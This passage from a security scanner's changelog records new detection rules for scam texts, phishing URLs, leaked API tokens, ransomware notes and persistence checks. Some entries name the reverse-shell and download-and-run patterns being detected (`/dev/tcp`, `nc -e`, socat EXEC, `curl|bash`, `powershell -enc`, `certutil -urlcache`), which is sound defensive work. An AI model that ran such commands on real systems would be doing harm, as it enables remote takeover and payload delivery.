- **Text: advance-fee loan fraud detection** (GAP-TEXT-LOAN): Added `regardless of
  credit history`, `regardless of credit score`, and related phrases to GROOMING_WORDS.
  "Congratulations, you are pre-approved... pay a processing fee via CashApp" improved
  from LOG(30) to BLOCK(65). Also added PRIZE+GROOMING amplifier (+15) for the
  advance-fee loan fraud pattern.
- **Text: crypto pump-and-dump detection** (GAP-TEXT-PUMP): Added `about to moon`,
  `huge pump`, `whale accumulation`, `100x potential`, `buy before the pump` and related
  phrases to GROOMING_WORDS. Pump-and-dump messages improved from OK(0) to ALERT(40).
- **Text: utility cutoff scam detection** (GAP-TEXT-UTILITY): Added `electricity will
  be disconnected`, `electricity service will be disconnected`, `power will be cut off`,
  `gas will be shut off`, `service will be disconnected today`, `avoid disconnection` and
  related phrases to EMERGENCY_SCAM_WORDS. Full utility scam message improved from
  LOG(28) to BLOCK(68); minimal form (URGENT + 1-800 + disconnect threat) BLOCK(78).
- **Text: 419/deceased-estate fraud detection** (GAP-TEXT-419): Added `estate of the
  late`, `funds of the late`, `the late mr`, `as the beneficiary of the estate` to
  BAIT_WORDS (previously these were absent, leaving classic 419 messages at LOG(30)).
  Full 419 estate-fraud message now BLOCK(74).
- **Text: romance/travel scam "stranded abroad" variant** (GAP-TEXT-ROMANCE): Added
  `i am stuck in`, `stranded in`, `my wallet was stolen`, `need money to return`,
  `i will repay you`, `please send me money` to EMERGENCY_SCAM_WORDS. Romance scam
  message with Western Union request improved from OK(0) to BLOCK(77).
- **Text: reshipping mule recruitment** (GAP-TEXT-RESHIP): Added `reship to our`,
  `reship to a`, `receive packages at your` to GROOMING_WORDS to catch reshipping scam
  messages where "at your address" separates "receive packages" from "reship". Package
  reshipping job scam improved from OK(0) to ALERT(40).

## [0.9.95] — 2026-06-13

### Security
- **URL: SECURITY_WORDS expanded — cancel, order, service, notification**
  (GAP-URL-SECWORDS): `amazon-order-cancel.com`, `paypal-order-cancel.com`,
  `microsoft-service-desk.com`, `apple-notification-center.com` all now
  correctly ALERT(55) via brand+security-word compound detection. Previously
  these scored OK(0) because none of the new words were in SECURITY_WORDS.
- **URL: FREE_HOSTS expanded — 000webhostapp, wixsite, weebly, godaddysites,
  mystrikingly, sites.google.com** (GAP-URL-FREEHOST): Brand phishing on these
  heavily-abused platforms now correctly ISOLATE(90). `microsoft-login.000webhostapp.com`
  improved from LOG(35) to ISOLATE(90).
- **Text: HMRC/CRA/ATO tax-authority impersonation detection** (GAP-TEXT-TAXAUTH):
  Added `hmrc`, `inland revenue`, `canada revenue agency`, `australian taxation
  office` to AUTHORITY_WORDS; added `tax refund`, `tax rebate`, `unclaimed tax
  refund`, `tax overpayment` to BAIT_WORDS. HMRC smishing now BLOCK(79), CRA
  smishing BLOCK(69), IRS smishing with URL ISOLATE(81).
- **Text: Amazon Prime / subscription renewal BazarCall detection**
  (GAP-TEXT-SUBSCRIB): Added `subscription is up for renewal`, `up for renewal`,
  `renewal has been processed`, `auto-renewed`, `membership renewal` to
  CALLBACK_PHISH_WORDS. Amazon Prime renewal vishing improved from LOG(38)
  to ISOLATE(83).
- **Text: delivery smishing — "attempted delivery" patterns** (GAP-TEXT-DELIVERY):
  Added `we attempted delivery`, `attempted delivery of your`, `delivery attempt
  failed`, `failed delivery attempt`, `we tried to deliver`, `unable to deliver
  your` to CALLBACK_PHISH_WORDS. USPS attempted-delivery smishing now LOG(15)
  instead of OK(0).
- **Text: upfront-fee job fraud / starter kit scam** (GAP-TEXT-JOBSCAM):
  Added `starter kit`, `reimbursed on first paycheck`, `purchase the equipment`,
  `equipment deposit required` and related phrases to GROOMING_WORDS. Fake job
  starter-kit scam with multiple signals now ALERT(40).
- **File: EXECUTABLE_EXTS expanded** (GAP-FILE-EXT2): Added `.one`/`.onetoc2`
  (OneNote embedded-attachment execution, top 2022-2023 vector), `.iso`/`.img`/
  `.vhd`/`.vhdx` (MOTW bypass disk containers), `.ppsm`/`.potm` (macro-enabled
  PowerPoint), `.iqy` (Excel Internet Query remote-execute), `.theme`/`.themepack`
  (ThemeBleed NTLM theft, CVE-2023-38146). Removed duplicate `.wsc` entry.
  F4 macro check extended to `.ppsm` and `.potm`.
- **File: BAIT_WORDS (LURE_WORDS)** — `customs fee` standalone added to
  CALLBACK_PHISH_WORDS for USPS smishing detection without "required" qualifier.
- **Secrets: DigitalOcean PAT, Atlassian API token, 1Password token**
  (GAP-SECRETS-EXPAND3): Added `dop_v1_` (DigitalOcean PAT), `ATATT` prefix
  (Atlassian/Jira/Confluence API token), `ops_v` (1Password service account
  token) to SECRET_PATTERNS. All three now ISOLATE(85) on bare token exposure.
- **Paste: P10 persistence injection** (GAP-PASTE-PERSIST): New P10 check
  detects SSH authorized_keys append, crontab persistence injection, and shell
  startup-file backdoor injection in clipboard payloads. Scores +50 (ALERT to
  ISOLATE when combined with other signals). FP guard: legitimate `ssh-copy-id`
  stays OK(0).
- **Protect: 2024-2025 ransomware note filenames** (GAP-PROTECT-RANSOM):
  Added ALPHV/BlackCat (`alphv_note.txt`, `blackcat_note.txt`), LockBit 3.0
  (`lockbit-readme.txt`), Nitrogen, Arkana, BEAST, SafePay, Play note filenames
  to RANSOM_NOTE_NAMES.

### Changed
- Version bumped from 0.9.94 to 0.9.95.

## [0.9.94] — 2026-06-13

### Security
- **Audit: A8 systemd user-unit persistence check** (GAP-AUDIT-A8):
  Scans `$HOME/.config/systemd/user/` for `.service`, `.timer`, and `.socket`
  unit files whose `ExecStart`/`ExecStartPre`/`ExecStop` lines contain the
  same dangerous patterns already guarded in A4 cron (`curl|bash`, `wget`,
  `base64 -d`, `/dev/tcp/`, `nc -e`, etc.). Attackers plant user-level
  systemd units to achieve login-persistent backdoors without root. Uses
  `O_NOFOLLOW|O_NONBLOCK` + `S_ISREG` guard (same pattern as A4) to prevent
  FIFO-block or symlink-redirect during the scan. Wired into `hlse_audit_all`.
  Header and file-level comment updated to document A6-A8.
- **URL: add chatgpt and gemini to BRANDS** (GAP-URL-AI-BRANDS):
  `chatgpt-login-verify.com` scored LOG(35); it now scores BLOCK(70).
  `chatgpt.com.free-upgrade.net` now scores BLOCK(65) via subdomain spoof.
  Legit `chatgpt.com` and `chat.openai.com` stay OK(0).
- **File: add .xll, .wll, .chm, .rdp, .sct, .job to EXECUTABLE_EXTS**
  (GAP-FILE-EXT): Excel/Word add-ins (shellcode delivery), Compiled HTML
  Help (hhctrl.ocx JScript), Remote Desktop files (auto-connect exploit),
  Windows Script Component, and Task Scheduler jobs. Double-extension
  masquerades (e.g. `invoice.pdf.rdp`) now score ISOLATE(85).
- **Text: MFA push-bombing, IT helpdesk impersonation, OTP relay**
  (GAP-TEXT-MFA): Added MFA fatigue phrases (`approve the notification`,
  `approve the sign-in request`, `just approve it`) to FAKE_ALERT_WORDS,
  IT helpdesk/department impersonation phrases (`this is your IT helpdesk`,
  `from IT security`, `corporate IT team`) to AUTHORITY_WORDS, and OTP
  relay phrases (`read me the code`, `tell me the code sent to you`) to
  FAKE_ALERT_WORDS. New `authority + bait` amplifier escalates IT-helpdesk +
  credential-harvest combinations from LOG(37) to ALERT(57). 2 CLI tests
  added (94 → 96).

### Changed
- Version bumped from 0.9.93 to 0.9.94.
- CLI integration tests: 94 → 96.

## [0.9.93] — 2026-06-11

### Security
- **Text: ClickFix / fake-CAPTCHA "paste-and-run" detection** (GAP-TEXT-CLICKFIX):
  Added a dedicated `ClickFix paste-and-run` signal targeting the top
  2024-2025 initial-access vector, where a fake "verify you are human" page
  tells the victim to press Win+R, paste an attacker-supplied PowerShell/mshta
  command, and press Enter. Signal matches high-specificity paste-execute
  instructions and living-off-the-land payload markers (`powershell -enc`,
  `mshta`, `invoke-expression`, `iex(`, `certutil -urlcache`). Amplifiers
  escalate to BLOCK/ISOLATE when combined with fake-CAPTCHA framing or a
  run-dialog invocation. Run-dialog phrases (Win+R) are intentionally kept
  out of the base signal — they are dual-use, so a legitimate IT instruction
  ("press Win+R, type cmd") stays OK while the paste-execute variant is
  flagged. Two CLI integration tests lock in both the detection and the
  FP guard.
- **Secrets: HashiCorp + AI + observability tokens** (GAP-SECRETS-EXPAND2):
  Added `VAULT_TOKEN`, `CONSUL_HTTP_TOKEN`, `NOMAD_TOKEN`, `BOUNDARY_TOKEN`
  (HashiCorp secrets management/orchestration), `GEMINI_API_KEY`,
  `GOOGLE_GEMINI_API_KEY`, `OPENROUTER_API_KEY`, `VERTEX_AI_KEY` (AI
  providers), and `PAGERDUTY_API_KEY`, `PAGERDUTY_TOKEN`, `OPSGENIE_API_KEY`,
  `GRAFANA_API_KEY` (incident/observability) to the ENV_SECRET watchlist.
- **URL: crypto-wallet brands + airdrop scam term** (GAP-URL-WEB3):
  Added `trezor`, `trustwallet`, `opensea`, `uniswap`, `pancakeswap`,
  `blockchain` to BRANDS (wallet-draining/seed-phrase phishing targets) and
  `airdrop` to SECURITY_WORDS. `airdrop` is overwhelmingly scam-correlated
  and near-absent from benign hyphenated registrable domains; generic terms
  like `wallet` were intentionally omitted to avoid FPs on legitimate
  `crypto-wallet-news.com`-style domains.
- **Supply: web3/crypto package watchlists** (GAP-SUPPLY-WEB3):
  Added `ethers`, `web3`, `wagmi`, `viem`, `hardhat`, `@solana/web3.js`,
  `@walletconnect/client`, `web3modal` (npm) and `web3`, `eth-account`,
  `eth-utils`, `web3py`, `solana`, `bitcoinlib` (pip). Wallet-drainer malware
  routinely ships as typosquats of these packages.
- **Text: toll-road / DMV smishing detection** (GAP-TEXT-TOLL):
  Added the FBI IC3 top-volume 2024-2025 smishing cluster (E-ZPass / FasTrak
  / SunPass / The Toll Roads impersonation: `unpaid toll`, `outstanding
  toll`, `toll balance`, `e-zpass`, `fastrak`, `sunpass`, `the toll roads`,
  …) and the 2025 DMV/registration successor wave (`registration will be
  suspended`, `dmv final notice`, `unpaid traffic ticket`) to the
  Callback/TOAD/smishing signal. Previously an E-ZPass lure scored OK(0);
  it now reaches ALERT(58), and a full toll lure with a payment URL reaches
  BLOCK(71). A single benign toll-brand mention stays at LOG(15) — it only
  escalates when combined with the urgency/payment/URL scam signature, so
  legitimate account messages are not flagged.

### Changed
- Version bumped from 0.9.92 to 0.9.93.
- CLI integration tests: 90 → 94 (ClickFix detection + FP guard, toll
  smishing detection + FP guard).

## [0.9.92] — 2026-06-10

### Security
- **URL: Trusted hosts expansion** (GAP-URL-TRUSTEDHOSTS):
  Added `microsoftonline.com`, `microsoft365.com`, `icloud.com` to TRUSTED_HOSTS.
  These legitimate Microsoft/Apple auth endpoints were scoring LOG(15) due to
  `/oauth` and `/signin` path patterns; now suppressed as expected.

- **URL: microsoftonline typosquat detection** (GAP-URL-MSONLINE):
  Added `microsoftonline` to BRANDS. `microsoft0nline.com` / `microsofton1ine.com`
  are now caught by the homoglyph and typosquat detectors at BLOCK(60+).

- **URL: Hyphenated subdomain spoof detection** (GAP-URL-SUBSPOOF):
  Extended `detect_subdomain_spoof()` to match brand names as hyphen-delimited
  tokens within subdomain labels. Previously `paypal-verify.login.net` and
  `microsoft365-sso.login.net` escaped detection; now both score ALERT(50).

- **Supply: Cargo ML/crypto crate watchlist expansion** (GAP-SUPPLY-CARGO):
  Added ML inference crates: `candle-core`, `candle-nn`, `candle-transformers`,
  `burn`, `burn-core`, `burn-tensor`, `ort`, `ndarray`, `linfa`.
  Added PKI/crypto crates: `rcgen`, `webpki`, `x509-parser`, `p256`,
  `ed25519-dalek`, `chacha20poly1305`, `argon2`, `pbkdf2`.

- **Supply: npm utility package watchlist expansion** (GAP-SUPPLY-NPM):
  Added `semver`, `minimist`, `node-fetch`, `cross-fetch`, `node-cache`,
  `winston`, `morgan`, `multer`, `socket.io-client`, `ws`, `got`, `supertest`,
  `aws-cdk`, `serverless`, `netlify-cli`, `vercel` — high-download packages
  absent from watchlist but targeted in active typosquat campaigns.

- **Protection: 2025 ransomware families** (GAP-PROTECT-RW2025B):
  Added extensions: `.hellcat`, `.blacklock`, `.eldorado`, `.apt73`.
  Added note filenames: `hellcat_readme.txt`, `blacklock_readme.txt`, `eldorado_readme.txt`.

- **Secrets: AI provider token patterns** (GAP-SECRET-AIPROVIDERS):
  Added explicit ENV_SECRET patterns for `GROQ_API_KEY`, `PERPLEXITY_API_KEY`,
  `DEEPSEEK_API_KEY`, `XAI_API_KEY`, `FIREWORKS_API_KEY`, `ANYSCALE_API_KEY`.

- **Text: Tech-support scam detection improvement** (GAP-TEXT-TECHSUPPORT):
  Added FAKE_ALERT_WORDS: "your computer has been infected", "your device has been
  infected", "at 1-800-", "at 1-888-", "at 1-877-" etc. — catches tech-support
  pop-up scam templates where toll-free number follows "contact us at" rather
  than "call".

- **Text: Investment/pig-butchering word-order variants** (GAP-TEXT-INVEST):
  Added GROOMING_WORDS: "returns guaranteed", "profits guaranteed", "100% safe",
  "100% guaranteed", "zero risk", "earn per week", "earn per day", "earn daily",
  "passive income guaranteed", "passive earning" — scam templates reverse
  "guaranteed returns" to evade naive pattern matching.

- **Text: Sign-in variant and customs duty detection** (GAP-TEXT-SIGNIN):
  Added FAKE_ALERT_WORDS: "unusual sign-in detected", "suspicious sign-in detected",
  "sign-in attempt detected", "login attempt detected".
  Added CALLBACK_PHISH_WORDS: "customs duty", "import duty" (USPS/FedEx smishing).

- **Text: Fake-order callback phrase gaps** (GAP-TEXT-FAKEORDER):
  Added FAKE_ALERT_WORDS: "if you did not place this order", "if you didn't place
  this order", "charge you did not authorize", "charge you did not make" —
  covers callback phishing TOAD templates that phrase fake-charge alerts
  differently from existing patterns.

### Changed
- Version bumped from 0.9.91 to 0.9.92.
- All 421 unit + CLI tests pass; zero warnings under strict flags.

## [0.9.91] — 2026-06-10

### Security
- **URL: Add malware delivery path patterns** (GAP-URL-MALWARE-PATHS):
  Added `/setup`, `/installer`, `/update.exe`, `/setup.exe` to PATH_PATTERNS.
  Combined with a suspicious TLD these push suspicious domains to ALERT tier.
  Example: `evil.xyz/download/update.exe` → ALERT(43).
  Trusted hosts (github.com, etc.) are unaffected by the O_NOFOLLOW guard.

- **Supply: Add Azure SDK packages to PIP_TOP watchlist** (GAP-SUPPLY-AZURE):
  Added `azure-core`, `azure-storage-blob`, `azure-identity`,
  `azure-keyvault-secrets`, `azure-mgmt-core` — high-value enterprise targets
  with documented typosquat campaigns (e.g. `azure-corr`, `azure-identty`).
  Also added `sentry-sdk`, `opentelemetry-api` (active typosquat campaigns).

- **Text: Add domain-expiry extortion scam patterns** (GAP-TEXT-DOMAINEXPIRY):
  Added URGENCY_WORDS: `final notice`, `last notice`,
  `domain will expire`, `domain expires`, `domain expiration`,
  `website will be taken down`, `hosting will be suspended`.
  These cover fake domain-expiry extortion scams that demand payment or
  account-recovery action under artificial time pressure.
  Test: "Final notice: your domain will expire in 24 hours." → LOG(24).

### Changed
- Version bumped from 0.9.90 to 0.9.91.
- All 421 unit + CLI tests pass; zero warnings under strict flags.

## [0.9.90] — 2026-06-10

### Security
- **File: Add macro-enabled Office and macOS pkg to executable extension list** (GAP-FILE-MACRODOC):
  `.docm`, `.xlsm`, `.pptm`, `.xlam`, `.ppam`, `.xlsb` (macro-enabled Office) and
  `.pkg`, `.mpkg` (macOS installer) were not in EXECUTABLE_EXTS. They now score
  SAFE(5) for extension alone and participate in lure-word detection. Examples:
  `hr_policy_2024.docm` → ALERT(45), `chrome_update.pkg` → ALERT(45).
  Added lure words: `readme`, `report`, `notification`, `policy`, `hr`, `compliance`,
  `legal`, `notice` — catching `README_important.exe` → ALERT(45).

- **Secrets: Add 22 missing ENV_SECRET patterns** (GAP-SECRET-ENVVARS):
  Added: Azure Storage connection string / account key / Cognitive / OpenAI key;
  Google API key, GCP API key, Firebase API key, Google Maps API key;
  S3 access/secret key variants; Notion token, Airtable PAT, Jira cloud token,
  Zendesk API token, Intercom access token, HubSpot API key,
  Salesforce access token; Mapbox access token, HERE API key;
  Twilio API key, Vonage API secret.

## [0.9.89] — 2026-06-10

### Security
- **Email E1: Fix brand-department display-name false positives** (BUG-EMAIL-E1-BRANDDEPT):
  The E1 display-name check used a flat keyword list that included generic role words
  ("support", "security", "admin", "helpdesk") alongside brand names. This caused
  "Apple Support" from apple.com, "Twitter Security" from twitter.com, and
  "Apple" from icloud.com to all score BLOCK(65) — false positives. Two fixes:
  (1) Added `brand_owns_domain(brand, domain)` with suffix-based matching (not substring)
  and a trusted-alternate-domain table (Apple→icloud.com/me.com, Amazon→amazonses.com,
  Facebook→facebookmail.com, Twitter→twitteremail.com/x.com, etc.). Uses "ends with"
  semantics so `accountprotection.microsoft.com` is trusted but `microsoft-verify.ru`
  is NOT.
  (2) Added `is_generic_display_role()` to suppress generic functional words when
  the primary brand already owns the From domain. Malicious senders (apple-verify.ru,
  microsoft-support.info) still trigger BLOCK(65). Added 3 regression tests.
  Secrets tests: 52 → 55.

## [0.9.88] — 2026-06-10

### Security
- **Text: Detect subscription-expiry and tech-support refund scam patterns** (GAP-TEXT-SUBSCRIP):
  Added URGENCY_WORDS: `click here to renew`, `account will be cancelled`,
  `will be automatically cancelled`, `membership expires in`, `membership will expire`,
  `subscription will expire`. Added BAIT_WORDS: `update your payment information`,
  `verify your payment information`, `confirm your payment information`,
  fake-charge indicators (`we have charged $`, `we have charged your`,
  `you have been charged for`, `charged to your account`, `we have debited your`,
  `auto-renewal charge`, `automatic renewal charge`).
  Amazon Prime/Netflix/domain-expiry phishing now scores LOG (was OK(0));
  tech-support refund scam ("We have charged $399, call to cancel") rises to BLOCK(67)
  (was ALERT(55)).  Zero FPs on legitimate charge confirmations and registrar emails.

## [0.9.87] — 2026-06-10

### Security
- **Core: Extend cp_fold() with Armenian and additional Greek/Cyrillic confusables** (GAP-URL-ARMENIAN):
  `cp_fold()` had no entries for Armenian script (even though `cp_script()` already
  classified it as CONFUSABLE). Attacks using Armenian lookalikes — ա (`apple.com`),
  ո (`google.com`), ե, հ — scored only LOG/ALERT(25-40). Added U+0561→'a', U+0565→'e',
  U+0578→'o', U+0570→'h'. Also added Cyrillic Komi De U+0501→'d' (`ԁiscord.com`) and
  Greek chi/omega U+03C7→'x', U+03C9→'w' (`ωhatsapp.com`). All four classes now reach
  BLOCK(60) via brand matching. Added 4 regression tests.

### Changed
- **Supply: Add P9 reverse-shell tests** (TEST-SUPPLY-P9):
  The P9 pastejacking signal (reverse shells: `/dev/tcp`, `nc -e`, Python socket, socat)
  added in v0.9.85 had no dedicated test coverage. Added 4 test cases covering all P9
  detection paths. Supply tests: 30 → 34.

- **Audit: Extend SUSPICIOUS_CRON_PATTERNS** (GAP-AUDIT-CRON):
  Added `xterm -display` (X11 reverse shell) and `msfvenom`/`meterpreter`
  (Metasploit payload indicators) to the cron persistence pattern list.

## [0.9.86] — 2026-06-10

### Security
- **Core: Fix raw-UTF-8 homoglyph blind spot + DRY the confusable table** (BUG-URL-MIXEDSCRIPT):
  `detect_mixed_script` had its own limited inline byte-switch that only
  folded 2-byte Cyrillic (0xD0/0xD1 lead bytes). Greek omicron
  (`gοοgle.com`, 0xCE 0xBF) and other Cyrillic ranges (palochka `ӏ`,
  0xD3 0x8F) collapsed to `?`, so the brand never matched —
  `gοοgle.com` scored only LOG(25) and `paypaӏ.com` ALERT(40). Replaced
  the inline switch with a proper UTF-8 code-point decoder that reuses
  the shared `cp_fold()` table (also extended with в/м/н/т/б/г Cyrillic
  and ι/ν/κ/υ/Β/Ο Greek). `gοοgle.com` → BLOCK(60), `paypaӏ.com` →
  BLOCK(75); legit IDNs (münchen.de, café.fr) stay advisory-only.

- **Secrets: Fix E1 display-name substring false positives** (BUG-EMAIL-E1-FP):
  the email-forensics E1 check matched known-brand tokens as raw
  substrings of the display name — `"First Choice"` matched `irs`
  (f-**irs**-t) and `"Backups Team"` matched `ups`, raising bogus
  IRS/UPS impersonation alerts. Added `contains_word()` (whole-word match
  bounded by non-alphanumerics) on the display-name side; the domain side
  keeps substring matching so lookalike domains embedding the brand
  (paypa1-verify.com) still suppress the alert for the genuine brand.
  Real PayPal/UPS impersonation with a mismatched From still fires E1.

- **Text: Detect Microsoft/Google sign-in-activity phishing** (GAP-TEXT-SIGNIN):
  FAKE_ALERT_WORDS += "unusual/suspicious sign-in activity",
  "new sign-in detected", "your microsoft account", "your google account
  has been". Prevalent template ("We detected unusual sign-in activity…")
  was scoring 0.

- **Text: BEC gift-card, SSA impersonation, billing & subscription gaps**:
  URGENCY_WORDS += "account is on hold", subscription-cancellation
  variants; SECRECY_WORDS += "keep it secret"; AUTHORITY_WORDS +=
  "social security number has been suspended" and SSA variants;
  BAIT_WORDS += "update your payment details". Netflix billing-hold,
  CEO gift-card BEC, and SSA robocall templates now score in band.

- **Text: Wallet-draining, ISP, unauthorized-order, loan & job-scam patterns**:
  FAKE_ALERT_WORDS += crypto wallet-draining ("wallet has been
  compromised", "move your crypto to safety", "coinbase security alert"),
  ISP impersonation ("internet will be disconnected"), unauthorized-order
  fraud ("order you did not authorize", "call our fraud department").
  GROOMING_WORDS += work-from-home and no-credit-check loan fraud openers.

- **Supply: Add P9 reverse-shell detection to pastejacking checker**:
  bash `/dev/tcp` redirect, `mkfifo`+`nc` named-pipe, Python socket
  (`os.dup2`+`connect`), and `socat EXEC:`/`TCP:` reverse shells —
  previously unmatched by the Unix P1–P8 checks.

- **Secrets: MongoDB/connection-string and generic key patterns**:
  ENV_SECRET += `MONGO_URI=`/`MONGO_URL=`, `REDIS_URI=`, MySQL/Postgres/
  MariaDB/CockroachDB/Elasticsearch URLs, `SECRET_KEY_BASE=`, `APP_KEY=`,
  `ENCRYPTION_KEY=`, `MASTER_KEY=`, `SIGNING_SECRET=`. Removed a duplicate
  `SECRET_KEY=` entry.

- **Core: Fix security-word matching and add giveaway/cloud-hosting phishing**:
  SECURITY_WORDS += "security" (was missing — "secure" is not a substring
  of "security"), "verification", "recovery", and giveaway words
  ("free", "giveaway", "nitro", …); PATH_PATTERNS += "/seed", "/mnemonic",
  "/recovery-phrase"; FREE_HOSTS += azurewebsites.net, blob.core.windows.net,
  s3.amazonaws.com, storage.googleapis.com, workers.dev, … Brand-in-subdomain
  phishing on cloud dev hosts now flagged.

- **File: Detect OS/browser update dropper lure names**:
  LURE_WORDS += "windows", "chrome", "firefox", "adobe", "flash", "java",
  "system", "microsoft", "google". `windows_update.exe`,
  `adobe_flash_player.exe`, `chrome_installer.exe` now reach ALERT;
  document files stay clean (lure scoring escalates only with an
  executable extension).

- **Audit: Detect alias hijacking + expand shell-rc coverage**:
  A6 now flags `alias ls/ps/sudo/ssh/...=` whose target invokes
  curl/wget/dev-tcp/nc/eval/base64/grep-v/python/tmp (rootkit file-hiding,
  sudo credential theft). Scanned files += `.bash_logout`, `.zlogin`,
  `.zlogout`, `.config/fish/config.fish`.

- **Protect: Expand anti-recovery commands and UEFI bootkit indicators**:
  R5 += vssadmin/wbadmin/bcdedit/zfs/fsutil/wevtutil backup-destruction
  variants; ESP_INDICATORS += MosaicRegressor, FinSpy, TrickBoot, Glupteba.

### Tests
- 404 structured tests (was 400). Secrets suite 52 (was 50): added E1
  substring-FP regression ("First Choice") and E1 UPS-impersonation tests.
  URL unit suite 33 (was 31): added raw-UTF-8 Greek-omicron and
  Cyrillic-palochka homoglyph regressions.
- F1 = 1.000 on both corpora; ASan/UBSan clean; fuzz 100K, 0 crashes.

## [0.9.85] — 2026-06-10

### Security
- **Text: Fix authority impersonation FP — remove substring-prone acronyms** (BUG-TEXT-IRS-FP):
  `irs` matched "first" (f-**irs**-t), `cia` matched "judicial", etc.
  Replaced standalone 3-letter acronyms with context-bearing phrases:
  "from the irs", "irs agent", "irs notice", "irs investigation", etc.
  IRS impersonation still detected; pig-butchering with "first" no longer
  triggers false Authority hit.

- **Text: Improve BEC authority patterns and wire transfer detection**:
  AUTHORITY_WORDS: added "as the ceo/cfo", "i am the ceo/cfo",
  "on behalf of the ceo", "acting ceo/cfo".
  BAIT_WORDS: added "wire the payment", "wire this payment",
  "process the wire", "send the payment".
  Result: "As the CEO…wire the initial payment" → ALERT[50] (was 0).

- **Text: 2025 smishing and urgency patterns** (GAP-TEXT-CLICKBAIT):
  URGENCY_WORDS: +7 click-bait patterns (click here to verify/confirm).
  CALLBACK_PHISH_WORDS: +12 delivery/USPS smishing variants.

- **Util: Expand benign-magic whitelist to 31 formats** (GAP-UTIL-MAGIC):
  Added OTF/WOFF/WOFF2 fonts, Apache Arrow IPC, DER X.509 certificate,
  Snappy framing format. Prevents false-positive entropy alerts on
  legitimate web fonts and cloud-native data files.

- **File: Add .dll to EXECUTABLE_EXTS; expand LURE_WORDS** (GAP-FILE-DLL):
  .dll now detected in double-extension attacks (document.pdf.dll).
  +9 LURE_WORDS: driver, codec, plugin, proof, memo, hacked, breach, etc.

- **Audit: Expand DNS hosts-poisoning watchlist** (GAP-AUDIT-DNS):
  SENSITIVE_DOMAINS: +16 entries (brokerages, P2P payment, Apple iCloud,
  social/communication platforms, streaming services).

- **Protect: Add 2025 UEFI bootkit indicator strings** (GAP-PROTECT-ESP):
  ESP_INDICATORS: LoJax, MoonBounce, CosmicStrand, ESPectre.

### Tests
- URL unit: 28 → 31 (norton brand, turbotax, pages.dev/wp-admin)
- Text unit: 15 → 18 (BEC, IRS FP regression, smishing)
- Util: 33 → 36 (OTF, WOFF, DER cert)
- Total: 391 → 400 (**milestone: 400 structured tests**)

## [0.9.80] — 2026-06-10

### Security
- **Secrets: SendGrid, HashiCorp Vault batch/recovery, Vercel patterns** (GAP-SECRET-2025):
  Added `SG.` (SendGrid, +85), `hvb.` (Vault batch, +80), `hvr.` (Vault recovery, +80),
  `vercel_token_` (+80). Total patterns: 43 → 47.

- **Audit: A7 sudoers NOPASSWD check** (GAP-AUDIT-SUDOERS): New function
  `hlse_audit_sudoers()` scans `/etc/sudoers` and drop-ins in `/etc/sudoers.d/`
  for `NOPASSWD` entries (+40 HIGH per match). Integrated into `hlse_audit_all()`.
  `HLSE_AUDIT_MAX_FINDINGS` bumped 24 → 32 for 7 modules.

- **Audit: Cloud SDK credential file permissions** (GAP-AUDIT-HOMESECRETS):
  HOME_SECRETS expanded with GCP ADC (`~/.config/gcloud/application_default_credentials.json`),
  GitHub CLI (`~/.config/gh/hosts.yml`), Terraform Cloud (`~/.terraform.d/credentials.tfrc.json`),
  Azure CLI (`~/.azure/credentials`), Heroku (`~/.heroku/credentials.json`).

- **URL: Security software, tax, collaboration brands** (GAP-URL-BRANDS-2):
  BRANDS gains: norton, mcafee, kaspersky, bitdefender, avast, malwarebytes (fake-AV);
  intuit, turbotax, quickbooks (tax phishing); office365, microsoft365,
  microsoftteams (BEC); truist (banking).
  PATH_PATTERNS gains: /wp-admin, /wp-login, /administrator, /oauth, /sso,
  /saml, /forgot, /password-reset.

- **Text: 2024-2025 delivery smishing patterns** (GAP-TEXT-SMISHING):
  CALLBACK_PHISH_WORDS gains 12 USPS/courier smishing variants: "package has been held",
  "customs clearance fee", "pay a small fee", "delivery charge unpaid", etc.
  URGENCY_WORDS gains 7 click-bait variants: "click here to verify/confirm/update",
  "your account will be terminated", etc. Result: USPS smishing → LOG[35] (was 0).

- **Supply: 2025 LOLBin and ransomware** (GAP-SUPPLY-LOLBIN-2025):
  P8 gains: msiexec silent install, expand.exe download, curl/wget→executable.
  RANSOM_EXTENSIONS: +6 families (Cloak, VanHelsing, 3AM, Nitrogen, Arkana, BEAST).
  RANSOM_NOTE_NAMES: +3 (cloak, 3AM, VanHelsing readmes).

## [0.9.75] — 2026-06-09

### Security
- **Secrets: Render, Fly.io, CircleCI, Contentful token patterns** (GAP-SECRET-PATTERNS):
  Added 4 new CI/CD and cloud platform token patterns: `rnd_` (Render, +80),
  `FlyV1` (Fly.io, +85), `CCIPAT_` (CircleCI, +85), `CFPAT-` (Contentful, +85).
  Total patterns: 39 → 43.

- **URL: Government TLD (.gov/.mil/.edu) text-scan suppression** (GAP-URL-GOV-FP):
  `hlse_scan()` now skips the text compound-signal scan for registry-restricted
  TLDs (.gov, .mil, .edu). These TLDs cannot be registered by attackers, so
  authority-impersonation hits (e.g. "irs" in `irs.gov/refund`) were false
  positives. `irs.gov/refund`: ALERT[47] → LOG[15]. Phishing domains like
  `irs-refund-alert.com` still score ALERT[47].

- **URL: Brand/path/TLD expansion** (GAP-URL-BRANDS): Added brands: venmo, zelle,
  cashapp, payoneer, ups, crypto. Added PATH_PATTERNS: /2fa, /otp, /mfa, /kyc,
  /transfer, /wire. Added SUSPICIOUS_TLDS: .sbs, .fit.

- **Audit: SSH X11Forwarding, AllowTcpForwarding, LoginGraceTime checks** (GAP-AUDIT-SSH):
  SSH audit (A1) now detects X11Forwarding yes (+15), AllowTcpForwarding yes (+15),
  LoginGraceTime > 60 or unlimited (+5) — common lateral-movement enablers.

- **Audit: Shell RC PROMPT_COMMAND injection and function override detection** (GAP-AUDIT-SHELLRC):
  A6 shellrc scan now detects `PROMPT_COMMAND=` injection (+40, every-prompt
  payload) and system-command function overrides for ls/ps/top/netstat/etc. (+35).
  Classic rootkit persistence not previously covered.

### Added
- **File: 7-Zip, Cabinet, WebAssembly magic byte detection** (GAP-FILE-MAGIC):
  MAGIC_TABLE gains 7-Zip (6-byte header), Cabinet/MSCF (Windows dropper),
  WebAssembly (\0asm). F2 mismatch: WASM with non-.wasm → +55; Cabinet with
  non-.cab/.msi → +40. Both added to polyglot-with-executable-ext check (+50).

## [0.9.70] — 2026-06-09

### Security
- **URL: IPv6 literal host phishing detection** (GAP-URL-IPV6): The IP-based
  phishing detector (brand-in-path +35, auth-path +15) now also fires on IPv6
  literal hosts (`[2001:db8::1]/paypal/signin`). Previously only IPv4 dot-
  notation was handled. `http://[2001:db8::1]/paypal/signin` now scores ISOLATE
  vs. ALERT before.

## [0.9.69] — 2026-06-09

### Security
